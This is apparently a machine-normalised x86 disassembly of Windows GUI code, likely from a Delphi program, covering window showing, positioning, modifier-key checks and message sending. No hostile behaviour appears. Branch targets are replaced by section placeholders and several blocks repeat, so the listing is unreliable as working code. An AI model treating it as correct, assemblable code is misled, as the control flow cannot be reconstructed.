mov edx [ ebp - 0x28 ]
call sub_441f24
pop ecx
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
sub eax [ esi + 0x18 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0xc ]
sub ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_418448
mov eax [ ebp - 0x18 ]
cmp eax [ esi + 0x10 ]
jg r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jle r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
add [ ebp - 0x18 ] ebx
mov eax [ ebp - 0x20 ]
sub eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
cmp edx eax
jle r-xdata
mov [ ebp - 0x18 ] eax
test edi edi
jle r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
add [ ebp - 0x1c ] edi
sub eax edi
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call InvalidateRect
mov [ ebp - 0x1c ] eax
sub_442150
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4593bc
test [ ebx + 0x1c ] 0x10
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x290 ] 0x0
je r-xdata
mov eax [ ebx + 0x290 ]
mov eax [ eax + 0x34 ]
call sub_4365a0
test eax eax
jle r-xdata
mov ebx [ esi + 0x8 ]
push 0xf
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebx + 0x4 ] eax
sub_44219c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x358 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_40484c
pop esi
pop ebx
retn
sub_4421c0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x358 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffae
call sub_40484c
pop esi
pop ebx
retn
sub_4421e4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_457a44
movzx eax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x268 ]
mov eax ebx
call sub_458b34
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x268 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
movzx edx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_458b34
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_442280
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4428dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_4471c4
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x4
xor edx edx
push ebp
push sub_4428bf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428c6
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_442791
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_442338
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x4
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_440fd0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
mov eax [ rw-data ]
call sub_443d84
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450210
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4585f8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_443d78
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450254
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585f8
call sub_43b75c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_443d9c
cmp ebx eax
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585f8
call sub_43ba80
mov ebx eax
mov eax [ rw-data ]
call sub_443d90
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_443d9c
mov ebx eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_443db4
mov ebx eax
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450210
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_443d84
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax esi
call sub_43df9c
mov ebx eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_443d90
mov esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_450af8
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_443d9c
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450254
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_443d78
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
add ebx eax
mov eax esi
call sub_43dfbc
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
call sub_43fdf4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
jmp r-xdata
sub ebx eax
mov eax [ rw-data ]
call sub_443da8
mov esi eax
sar esi 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_443d9c
cmp ebx eax
jge r-xdata
adc esi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_443d9c
cmp ebx eax
jge r-xdata
adc esi 0x0
add eax edx
mov esi eax
jmp r-xdata
adc edx 0x0
mov eax [ rw-data ]
call sub_443d90
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
call sub_443d90
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_443d9c
mov ebx eax
mov eax [ rw-data ]
call sub_443d90
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_443d9c
mov ebx eax
sub esi eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ rw-data ]
call sub_443d90
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_443d90
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_43fdf4
jmp r-xdata
sub_44233d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4467a4
call sub_404f40
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_443d84
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450210
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_443d78
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450254
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x7
jne r-xdata
mov eax [ rw-data ]
call sub_443d9c
cmp ebx eax
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ rw-data ]
call sub_443d90
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_443d9c
mov ebx eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_443db4
mov ebx eax
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450210
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_443d84
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax esi
call sub_43df9c
mov ebx eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_443d90
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428c6
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_450af8
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_443d9c
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450254
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_443d78
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
add ebx eax
mov eax esi
call sub_43dfbc
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
call sub_43fdf4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
jmp r-xdata
sub ebx eax
mov eax [ rw-data ]
call sub_443da8
mov esi eax
sar esi 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_443d9c
cmp ebx eax
jge r-xdata
adc esi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_443d9c
cmp ebx eax
jge r-xdata
adc esi 0x0
add eax edx
mov esi eax
jmp r-xdata
adc edx 0x0
mov eax [ rw-data ]
call sub_443d90
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
call sub_443d90
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_443d9c
mov ebx eax
mov eax [ rw-data ]
call sub_443d90
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_443d9c
mov ebx eax
sub esi eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ rw-data ]
call sub_443d90
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_443d90
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_43fdf4
jmp r-xdata
sub_442796
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4467a4
call sub_404f40
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_440fd0
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4585f8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428c6
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585f8
call sub_43b75c
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585f8
call sub_43ba80
mov ebx eax
sub_442914
push ebx
mov ebx eax
mov eax ebx
call sub_4598d4
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
sub_44296c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424528
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4429ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_404650
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_4429d8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffa5
call sub_40484c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_442a04
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x358 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
mov [ ebx + 0x294 ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x270 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_446734
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffad
call sub_40484c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_442ba4
jmp r-xdata
mov eax ebx
call sub_442c80
mov dl 0x1
mov eax ebx
call sub_43fdb4
jmp r-xdata
sub_442aa8
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x2e2 ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_43f528
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_43f574
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
sub_442b0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442b79
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
movzx eax [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_40484c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x294 ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_442c80
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442bc4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442c43
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x276 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442c4a
lea eax [ ebp - 0x4 ]
call sub_405530
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov eax ebx
call sub_458904
test al al
jne r-xdata
mov eax ebx
call sub_440ea4
sub_442c50
push ebx
mov ebx eax
mov [ ebx + 0x344 ] edx
xor eax eax
mov [ ebx + 0x340 ] eax
mov eax ebx
call sub_458904
test al al
je r-xdata
mov eax ebx
call sub_4551b8
pop ebx
retn
mov eax ebx
call sub_454ff0
pop ebx
retn
sub_442c9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442f8e
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_44edc0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4453d8
xor edx edx
push ebp
push sub_442f71
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x330 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
jne r-xdata
call GetActiveWindow
mov [ ebp - 0x1c ] eax
call sub_43b77c
mov [ ebp - 0x10 ] eax
